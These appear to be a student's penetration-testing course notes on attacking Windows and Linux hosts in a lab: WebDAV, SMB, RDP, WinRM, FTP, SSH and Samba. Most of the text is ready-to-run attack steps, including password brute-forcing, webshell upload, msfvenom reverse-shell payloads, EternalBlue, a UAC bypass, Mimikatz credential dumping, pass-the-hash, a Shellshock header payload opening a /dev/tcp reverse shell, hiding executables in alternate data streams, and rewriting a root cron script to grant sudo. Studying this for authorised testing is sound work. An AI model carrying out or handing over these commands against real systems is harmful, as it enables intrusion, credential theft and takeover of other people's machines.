# Host Based Attacks

- Targeted against a specific host/system

## Overview over Windows vulnerabilities

**Types of windows vulnerabilities (not complete)**

- Information Disclosure
- buffer overflows
- Remote code execution
- privilege escalation
- Denial of Service

**Frequently Exploited Windows services**

- **|** Microsoft IIS **|** TCP Ports 80/443 **|** Proprietary web server **|**
- **|** WebDav(Web Distributed Authoring & versioning) **|** TCP Ports 80/443 **|** HTTP extention that Allows client to update, delete , move and copy files on a web server. WebDAV is used to enable a web server to act as a file server. **|**
- **|** SMB/CIFS(Server Message Block Protocol) **|** TCP port 445 **|** Network file share on a LAN **|**
- **|** RDP **|** TCP port 3389 **|** Remotely authenticate and interact with a Windows system **|**
- WinRM(Windows Remote Management Protocol) **|** TCP ports 5986/443 **|** Windows remote management protocol that can be used to facilitate remote access with windows systems. **|**

### Exploiting Microsoft IIS WebDAV

Configured to run on ports 80/443

- Supported executable file extentions: .asp, .aspx, .config, .php
- edits and manage files
- connect through credentials
  _Tools_

  - davtest - used to scan, authenticate and exploit a WebDAV server
  - cadaver - cadaver supports file upload, download, on-screen display etc

  _Exploitation process_

  - Identify whether WebDav has been configured to run on the IIS web server
  - brute-force attact on order to identify legitamate credentials we can use for authentication

  * authenticate then upload a malicious .asp payload that can be used to execute arbitary commands or optain a reverse shell on the target

  _Step-by step_

  1. Do nmap scan: `nmap -sV -sC 10.10.x.x`
  2. after identifying IIS Web DAV: `nmap -sV -p 80 --script= http-enum 10.10.x.x`
  3. go to browser `10.10.x.x/webdev` , here you can authenticate once you have credentials
  4. Hydra to brute force: `hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_paswords.txt 10.10.x.x http-get /webdav/`, example wordlist(that might work)
  5. log in
  6. use davtest: `davtest -auth username:password -url http://10.10.x.x/webdav `, will whow you what files can be uploded and files that can be executed, the last is important and shows us an attack vector
  7. use cadaver to upload file: `cadaver http://10.10.x.x/webdav`, then authenticate.
  8. upload a webshell(asp) through cadaver when connected: `put /usr/share/webshells/asp/webshell.asp`.
  9. Go to browser again to see if it has been uploaded and click on the .asp file, then run commands on the page: to look at C:\ drive type `dir C:\` , to see file(flag.txt), type `type C:\flag.txt`

_with metasploit_

1.  scan first to check if IIS Web DAV is there
2.  create your own payload with msfvenom: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=1234 -f asp > shell.asp`
3.  open cadaver and connect to the webdav: `cadaver http://10.10.x.x/webdav` , then upload the shell file: `put /root/shell.asp`
4.  start postgres server and msfconsole: `service postgresql start && msfconsole`.
5.  msfconsole: `use multi/handler` , `set payload /windows/meterpreter/reverse_tcp `, `set LHOST and LPORT`(same as shell.asp), hit `run`
6.  open browser and click on the shell.asp file that was uploaded
7.  find what you are looking for.
8.  _You can use a metaasploit script for automating all of it_. in msfconsole `search iis upload`, looking for exploit/windows/iis/iis_webdav_upload_asp

### Exploiting SMB with PsExec

- user authentication
- share authentication

1. nmap sca `nmap -sV -sC 10.10.x.x`
2. smb brute force, start msfconsole: `service postgresql start && msfconsole`
3. msfconsole: `serach smb_login` and use.
4. set options:
   - `set RHOSTS`,
   - `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`,
   - `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_user.txt`,
   - `set VERBOSE false` < - for only succeced attempts
5. use psexec.py to login with found credentials: `psecexec.py Administrator@10.10.x.x cmd.exe`, fill in the passwords

_use psexec with metasploit_

1. in msfconsole search: `search psexec`, looking for`exploit/windows/smb/psexec`, fill in options

### Eternal Blue
- you can first check if target is vulnerable by: `msfconsole` -> `search eternalblue` --> use the auxilary scanner: `auxiliary/scanner/smb/smb_ms17_010` 
1. nmap script to check if internal blue `sudo nmap -sV -p 445 --script=smb-vuln-ms17.010 10.10.x.x`
2. msfconsole: `search eternalblue`
3. `use exploit/windows/smb/ms17:010_eternalblue`
4. set options

### Exploiting RDP

- RDP uses TCP port 3389 by default, and can also be configured to run on any other TCP port
- preform a bruteforce

1. preform nmap: `nmap -sV -p- 10.10.x.x`
2. verify RDP port by using msfconsole: `service postgresql start && msfconsole`
3. search msfconsole: `search rdp_scanner` (auxilary/scanner/rdp/rdp_scanner)
4. set options: `set RHOSTS` & `set RPORT` and run
5. brute-force HYDRA: `hydra -L /usr/share/metasploit-framework/data/wordlists/common_user.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.10.x.x -s <port>`
6. xfreerdp with creds: `xfreerdp /u:username /p:password /v:10.10.x.x:port`

### Exploit WinRM

- Windows remote managment facilitates remote access with windows systems over HTTP(s)
- WinRM Typically uses TCP port 5985 and 5986(HTTPS)
- can use crackmapexec to perform a brute-force on WinRM
- also evil-winrm to optain command shell

1. scan with nmap `nmap -sV -sC -p5000-6000 10.10.x.x` , the result will not say that it is WinRM, but from the port number we can deduce it
2. use crackmapexec to both confirm and brute force: `crackmapecex`
3. In crackmapexec: `crackmapexec winrm 10.10.x.x -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
4. after opataining creds check command with -x: `crackmapexec winrm 10.10.x.x -u administrator -p tinkerbell -x "whoami"` or "systeminfo"
5. evil-winrm to get shell: `evil-winrm.rb -u administrator -p 'tinkerbell' -i 10.2.19.116`
6. find flag

_meterpreter_

1. `service postgresql start && msfconsole`
2. search: `search winrm_script`, look for exploit/windows/winrm/winrm_script_excec
3. set options + also set FORCE_VBS true

## Privelege Escalation

### meterpreter elevation

- in msfconsole you can use the privelege escalation suggester.

1. when logged in to meterpreter, on the system you have compromised with low level creds, type `getsystem` to see if you can just raise priveleges that way. if not go to step 2.
2. after gaining access to the machine in msfconsole(nmap scan then get creds(low level), then get access), background the session( `background` see picture) search for `search suggester`
   ![alt text](/assets/meterpreter_background_session.png)
3. `use post/multi/recon/local_exploit_suggester`
4. run one of the following that fits

**Windows Kernel exploits**

- user mode, limited access
- kernel mode, highest level of access

### Bypassing UAC with UACME

- User Account Control
- Windows security feature
- can be bypassed

Pre-requisites to bypass UAC:

1. access to user Account
   that is part og the local administrators group on the windows target system
2. if UAC protection level is set below high, windows programs can be executed with elevated privileges without the user for confirmation
3. tools will vary by windows version

**Exploit UAC**
STEP 1: Getting user account

1.  nmap scan, identify
2.  (this is for rejetto file server 2.3)
3.  open msfconsole: `service postgresql start && msfconsole`
4.  search rejetto vuln: `serach rejetto`
5.  configure options then run
6.  som commands and actions: 1.`sysinfo`, 2.`pgrep explorer`, 3.`migrate <number you got from prev command>`,

**Privelege escalation:**
github repository for exploiting:https://github.com/hfiref0x/UACME
STEP 2: Privelege escalation

7. create a reaverseshell: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your IP> LPORT=1234 -f exe > shell.exe`
8. set up listener, new msfconsole session: `msfconsole`
9. in msfvenom `use multi/handler`
10. payload: `set payload windows/meterpreter/reverse_tcp`
11. `set LHOST` , `set LPORT` <-- to port created in shell.exe, then hit `run`
12. IN THE WINDOWS ACCOUNT METERPRETER SESSION: navigate to C: `cd C:\\`
13. create Temp dir: `mkdir Temp` then `cd Temp`
14. Upload shell `upload shell.exe`
15. upload Akagai64(UAC Exploit): `upload /root/Desktop/tools/UACME/Akagi64.exe`
16. open shell session: `shell`
17. exploit method 23, should bet elevated privs: `.\Akagi64.exe 23 C:\Temp\shell.exe`
18. migrate to lsass.exe(for NT AUTHORITY\SYSTEM): list processes:`ps`, `migrate 688` <--PID number , when in folder(INFO):`C:\Windows\system32`
19. get hashdump NTLM hashdump: `hashdump`

### Privelege Escalation: Access Token Impersonation

- Privileges required for a successful impersonation attack:
  - SeAssignPrimaryToken
  * SeCreateToken
  - SeImpersonatePrivilage

INFO: this also exploit the rejetto 2.3 version as UAC with UACME

1. `service postgresql start && msfconsole` -> `search rejetto`
2. set options then `run`
3. `getprivs` to check if you have the required privileges
4. `load incognito`
5. `list_tokens -u`
6. `impersonate_token "highest_level\Administrator"` <- copy the highest level you find(, if no high level is found you need to do a potato attack(?)) then run
7. `pgrep explorer` -> `migrate number_found`
8. `cat C:\\UsersAdministrator\\Desktop\\flag.txt`

### Alternate Data Streams

- ADS, NTFS file attribute.
- two forks: 1. Data stream(data of the file), 2.Resource stream(meta data)
- Attackers use ADS to hide malicious code or executable in legidimate files
- evade AVs and static scanning tools
- hide in resource stream

1. on windows: `notepad legitimate_file.txt:secret_file.txt`, create the file
2. if you want to open hidden file: `notepad legitimate_file.txt:secret_file.txt`
3. hide executable `notepad legitimate_file.txt:payload.exe`
4. move .exe in secret .txt file, on windows: `type payload.exe > legimitate_file:payload.exe`
5. run file(on windows): `start legitimate_file.txt:payload.exe`
6. Not working? symbolic link: `cd Windows\System32` -> `mklink wupdate.exe C:\absolute_file_path(ususally Temp fodler)\legitimate_file.txt:payload.exe`
7. may not work if you do not have adm privileges.

### Windows password hashes

- Hashes stored in SAM
- NTLM: MD4 hashing

### Searching for passwords in Windows Config Files

1. create payload: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=1234 -f exe > payload.exe`
2. simple httpserver: `python -m SimpleHTTPServer 80`
3. REAL: First gain access through vulnerablility, download the file to the victims computer
4. COURSE: victims pc: cmd -> `certutil -urlcache -f http://10.10.x.x/payload.exe payload.exe`
5. STOP python serve START msfconsole `service postgresql start && msfconsole`
6. `use multi/handler` -> `set payload windows/x64/meterpreter/reverse_tcp` -> `set LPORT 1234` -> `set LHOST 10.10.x.x`
7. execute on target system/victim pc
8. meterpreter session: `search -f Unattend.xml` OR
9. `cd C:\\` -> `cd Windows` -> ` cd Panther` -> look for Unattend.xml file -> `download unattend.xml`
10. look for usercreds = AutoLogon (encoded base64), create new file -> `vim password.txt` -> save password -> base64 -d password.txt
11. logon with adm creds: `psexec.py username@10.10.x.x`

### Dumping Hashes With Mimikatz

- post exploitation tool
- allows extraction of clear-text passwords, hashes and Kerberos tickets from memory
- extract hashes from lsass.exe process memory
- can be utilized with meterpreter extention Kiwi
- Mimikatz will require elevated privleges in order to run correctly

1. nmap: `nmap -sV 10.10.x.x`
2. `service postgresql start && msfconsole`
3. search `search badblue`, look for for "exploit/windows/http/badblue_passthru"
4. set options and exploit
5. meterpreter: `sysinfo`, `getuid`, `pgrep lsass` -> migrate to number
6. `getuid` = NT AUTHORITY\SYSTEM
7. `load kiwi` -> `creds_all`
8. `lsa_dump_sam` and then `lsa_dump_secrets`
9. navigate: `cd C:\\` -> `mkdir Temp` -> `cd Temp` -> `upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe` -> `shell`
10. open Mimikatz `.\mimikatz.exe`
11. check priveleges: `privilege::debug` -> Privelege '20' OK = good to go
12. `lsadump::sam`
13. `lsadump::secrets`
14. Display logon passwords `sekurlsa::logonpasswords`

### Pass-The-Hash Attack

DO MIMIKATZ FIRST!

- After optaining hashes
- Exploitation technique
- Tools: Metasploit PsExec module and Crackmapexec
- after attack will optain access to the target system via legitimate credentials as opposed to acces via service exploitation

1. From previously mimikatz dump, DO THAT FIRST!!
2. create a text file from dump from admins and users: copy the "Hash NTLM" and LM hash from step 3
3. `hashdump`, then copy see picture
   ![alt text](/assets/hash_dump.png)
4. background session: `search psexec` look for exploit/windows/smb/psexec
5. set options: check LPORT and maybe cahnge -> `set RHOSTS` -> `set SMBUSER Administrator` -> `set SMBPASS LM&NTLMHASH` <--- see picture for hash copied -> `set target Command` OR `set target Native\ upload` -> exploit

##  Frequently Exploited linux services / Linux exploitation and enumeration
- Apache web server | TCP 80/443
- SSH | TCP 22
- FTP | TCP 21
- SAMBA | TCP 445
  
  ### Shellshock(Exploiting Bash CVE-2014-6271 Vulnerability)
  - Prerequisites: locate an input vector or script that allows you to communicate with Bash
  - In the context of a web server, we can utilize any legitimate CGI scripts accessible on the web server
  - Whenever a CGI script is executed, the web server will initiate a new process and run CGI script with Bash
  - can be exploited manually or mMSF module
  - Special characters can be inserted in the User-Agent Header(see picture)
 1. scan with nmap
 2. open web page and inspect the source, look for script
 3. Identify with nmap if page is vulnerable: `nmap -sV 10.10.x.x --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"`
 4. Open burp, capture page(or script) and send to repeater, change the user-agent header: `(){ :; }; echo; echo; /bin/bash -c 'cat /etc/passwd/` and send
 5. *Reverse shell:* set up netcat listner: `nc -nvlp 1234`
 6. In Burp Suite change User-Agent to:  `(){ :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/10.10.x.x/1234 0>&1` then hit send.
  ![alt text](/assets/shellshock.png)
**MSF Shellshock Exploit**
1. start: `service postgresql start && msfconsole`
2. search: `search shellshock` look for: `exploit/multi/http/apache_mod_cgi_bash_env_exec` use 5 maybe?
3. set options: RHOSTS, set TARGETURI `/gettime.cgi` <--- this is the exploitable cgi script
4. run

### Exploiting FTP
- FTP port 21, file sharing
- Can be anonymous access: check: `nmap -sV 10.10.x.x --script=ftp-anon`
- can be a brute force attack
- Search for version vuln: `searchsploit versionOfFTP`
1. After FTP found: try anonymous `ftp 10.10.x.x 21` 
2. If not 1. : find namp scripts `ls -la /usr/share/nmap/scripts/ | grep ftp-* ` -> run nmap script: `nmap -sV 10.10.x.x --script=ftp-anon`
3. Hydra bruteforce: `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.10.x.x -t 4 ftp`
4. login: `ftp 10.10.x.x` --> fill in username and password --> to download / show file `get secret.txt`

### Exploiting SSH
- TCP port 22
1. Brute force attack: `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt 10.10.x.x -t 4 ssh`
2. login: `ssh sysadmin@10.10.x.x`

### Exploiting SAMBA
- port 445, maybe 139
- brute force, SMBmap to enumerate, SMBclient also
1. `nmap -sV 10.10.x.x`
2.  Brute-force: DEMO command:`hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.10.x.x -t 4 smb`
3.  SMBMAP: `smbmap -H 10.10.x.x -u username -p password`
4.  SMBCLIENT share access: `smbclient //10.10.x.x/sharename  -U username` <-- need passwords optained for this
5.  in smb: `dir` etc, `get file.tar.gz` <-- after on linux`tar xzf file.tar.gz`
6.  flag in nancy, admin. 
7.  
**Enum4linux**
1. `enum4linux -a 10.10.x.x`
2. using after bruteforce: `enum4linux -a -u username -p password 10.10.x.x`

### Exploiting CRON jobs
- task sheduling. a application or script that is configured to run repeatedly with Cron is known as a cron job
- Cron job that have been created by the root user will have root priveleges
- find and identify cronjobs
  !!After logging in and having credentials!!
1. to see file privileges `ls -al`, to see list of sheduled cron jobs `crontab -l`
2.  look for occurences of the root privileged files : `grep -rnw /usr -e "/home/student/message"`
3.  `ls -al /usr/local/share/copy.sh`
4.  `printf '#!/bin/bash\necho "youraccount ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh`
### Exploiting SUID Binaries PRiv esc technique
- depends on the owner of the SUID binary: needs root privileges.
- In order to elevate our privileges, we will need to identify an SUID binary that is owned by the "root" user.
!!THIS DEMO IS ALREADY GOT IN TO THE SYSTEM, THIS IS PRIVESC PART!!
"student demo"
R=READ - W=WRITE - S=SUID - X=EXECUTE - 
1. `groups youraccount`
2. lists files detailly with hidden files: `ls -al`
3. ...

### Dumbping Linux Password Hashes
-optaining bash session if backdoor exploit: `/bin/bash -i`
- all encrypted passwords are stored in the: /etc/shadow , root priv
-  password HASH: $1=MD5 $2=Blowfish $5=SHA-256 $6=SHA-512
-  !!Gain privilege first and root user!!
1. if root user: `cat /etc/shadow`
2. background meterpreter session and `search hashdump`